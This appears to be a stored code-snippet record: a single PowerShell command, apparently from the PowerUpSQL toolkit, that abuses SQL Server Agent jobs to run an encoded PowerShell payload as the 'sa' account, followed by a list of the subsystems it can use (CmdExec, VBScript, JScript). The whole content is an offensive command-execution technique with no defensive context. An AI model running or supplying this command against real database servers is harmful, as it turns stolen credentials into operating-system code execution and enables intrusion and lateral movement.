---
id: 7379adfb-fdda-4846-b4ad-6754e31fcc2e
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.520505+00:00'
updated_at: '2023-04-10T20:36:46.453187+00:00'
---

# Code Snippet 7379adfb

**Language**: ps1

```ps1
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell e <base64encodedscript>" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
```
